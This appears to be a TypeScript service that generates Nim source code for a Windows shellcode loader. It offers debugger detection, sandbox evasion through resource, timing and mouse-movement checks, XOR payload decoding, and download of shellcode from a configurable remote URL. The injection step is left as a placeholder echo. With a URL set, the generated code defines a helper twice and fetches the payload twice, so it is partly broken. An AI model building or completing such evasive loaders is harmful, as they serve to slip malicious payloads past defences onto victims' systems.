import { PayloadRequest } from '../schemas/payload.schema';

export class PayloadService {

    generateSource(config: PayloadRequest): string {
        const imports = ['winim/lean', 'strutils']; // strutils for parsing if needed
        if (config.shellcode_url) {
            imports.push('puppy');
        }

        const directives = [];
        // ASM needed for PEB check if anti_debug is used
        if (config.anti_debug.length > 0) {
            directives.push('{.passC: "-masm=intel".}');
        }

        const utilsBlock = this.generateUtilsBlock(config);
        const evasionProcs = this.generateEvasionProcs(config);
        const shellcodeBlock = this.generateShellcodeBlock(config);
        const mainLogic = this.generateMainLogic(config);

        return `
import ${imports.join(', ')}

${directives.join('\n')}

${utilsBlock}

${evasionProcs}

${shellcodeBlock}

proc main() =
${mainLogic}

main()
`;
    }

    private generateUtilsBlock(config: PayloadRequest): string {
        let code = `
func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))
`;
        if (config.xor_key) {
            code += `
proc xorDecodeMulti(data: seq[byte], key: seq[byte]): seq[byte] =
    result = newSeq[byte](data.len)
    let keyLen = key.len
    for i in 0..<data.len:
        result[i] = data[i] xor key[i mod keyLen]
`;
        }

        // Fibonacci needed for timing evasion
        if (config.anti_sandbox.includes('timing')) {
            code += `
proc fibonacci(n: int): string =
  if n == 0: return "0"
  if n == 1: return "1"
  var a = @[0]
  var b = @[1]
  for i in 2..n:
    var carry = 0
    var temp: seq[int] = @[]
    let maxLen = max(a.len, b.len)
    for j in 0..<maxLen:
      let digitA = if j < a.len: a[j] else: 0
      let digitB = if j < b.len: b[j] else: 0
      let sum = digitA + digitB + carry
      temp.add(sum mod 10)
      carry = sum div 10
    if carry > 0: temp.add(carry)
    a = b
    b = temp
  result = ""
  for j in countdown(b.high, 0):
    result.add($b[j])
`;
        }
        return code;
    }

    private generateEvasionProcs(config: PayloadRequest): string {
        let code = "";

        // --- Anti-Sandbox ---
        if (config.anti_sandbox.includes('cpu_ram')) {
            code += `
proc checkResources(): bool =
    var sysInfo: SYSTEM_INFO
    GetSystemInfo(addr sysInfo)
    if sysInfo.dwNumberOfProcessors < 2:
        return false
    var memStatus: MEMORYSTATUSEX
    memStatus.dwLength = cast[DWORD](sizeof(memStatus))
    GlobalMemoryStatusEx(addr memStatus)
    if cast[uint64](memStatus.ullTotalPhys) < 2147483648'u64:
        return false
    return true
`;
        }
        if (config.anti_sandbox.includes('timing')) {
            code += `
proc sleepObfuscation(): bool=
    let n = 100000
    let result = fibonacci(n)
    return true
`;
        }
        if (config.anti_sandbox.includes('human_behavior')) {
            code += `
proc checkMouseMovement(): bool =
    var startPos: POINT
    GetCursorPos(addr startPos)
    let startTime = GetTickCount()
    while true:
        var currentPos: POINT
        GetCursorPos(addr currentPos)
        let dist = abs(currentPos.x - startPos.x) + abs(currentPos.y - startPos.y)
        if dist > 50:
            return true
        if (GetTickCount() - startTime) > 20000:
            echo "[-] Sandbox detected: No mouse movement"
            return false
        Sleep(100)
`;
        }

        // --- Anti-Debug ---
        if (config.anti_debug.includes('is_debugger_present')) {
            // ASM check for PEB.BeingDebugged
            code += `
proc pebBeingDebugged(): bool {.asmNoStackFrame.}=
    asm """
    mov rax, gs:[0x60]
    movzx rax, byte ptr [rax+2]
    ret
    """
`;
        }

        return code;
    }

    private generateMainLogic(config: PayloadRequest): string {
        let code = "";

        // 1. Anti-Debug Checks
        if (config.anti_debug.includes('is_debugger_present')) {
            code += `
    if IsDebuggerPresent(): quit(0)
    if pebBeingDebugged(): quit(0)
`;
        }
        if (config.anti_debug.includes('nt_global_flag')) {
            // Placeholder if implemented later
        }

        // 2. Anti-Sandbox Checks
        if (config.anti_sandbox.length > 0) {
            code += `    echo "[*] Performing sandbox checks..."\n`;
            if (config.anti_sandbox.includes('timing')) {
                code += `    if not sleepObfuscation(): quit(0)\n`;
            }
            if (config.anti_sandbox.includes('cpu_ram')) {
                code += `    if not checkResources(): quit(0)\n`;
            }
            if (config.anti_sandbox.includes('human_behavior')) {
                code += `    if not checkMouseMovement(): quit(0)\n`;
            }
        }

        // 3. Shellcode Retrieval
        if (config.shellcode_url) {
            code += `
    let shellcodeStr = extractShellCodeWithHttp()
    if shellcodeStr.len == 0: quit(0)
    var shellcodeByte: seq[byte] = toByteSeq(shellcodeStr)
`;
        } else {
            // For raw shellcode, 'shellcode' array is already global, convert to seq for uniformity if needed
            // or just cast logic. But 'xor' expects seq usually.
            code += `
    # Convert array to seq for easier handling
    var shellcodeByte = @shellcode
`;
        }

        // 4. XOR Decryption
        if (config.xor_key) {
            // Parse key string "0xDE,0xAD" -> seq[byte]
            const keyBytes = config.xor_key.split(',').map(s => s.trim());
            code += `
    let xorKeyMulti: seq[byte] = @[${keyBytes.map(k => `${k}'u8`).join(', ')}]
    var finalShellcode = xorDecodeMulti(shellcodeByte, xorKeyMulti)
`;
        } else {
            code += `    var finalShellcode = shellcodeByte\n`;
        }

        // 5. Injection (Placeholder for now)
        code += `    echo "Running shellcode (size: " & $finalShellcode.len & ")"\n`;

        return code;
    }

    private generateShellcodeBlock(config: PayloadRequest): string {
        if (config.shellcode) {
            // Raw shellcode case
            const shellcodeStr = config.shellcode.trim();
            const bytes = shellcodeStr.split(',').filter(s => s.trim().length > 0);
            const size = bytes.length;

            return `var shellcode: array[${size}, byte] = [${shellcodeStr}]`;
        }
        else if (config.shellcode_url) {
            // URL case using puppy
            return `
proc extractShellCodeWithHttp(): string =
    try:
        result = fetch("${config.shellcode_url}")
        return result
    except PuppyError as e:
        echo "Erreur HTTP: ", e.msg
        return ""

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

# Initialize shellcode on heap for HTTP
let shellcodeStr = extractShellCodeWithHttp()
var shellcode: seq[byte] = toByteSeq(shellcodeStr)
`;
        }

        return ""; // Should be caught by validation
    }
}
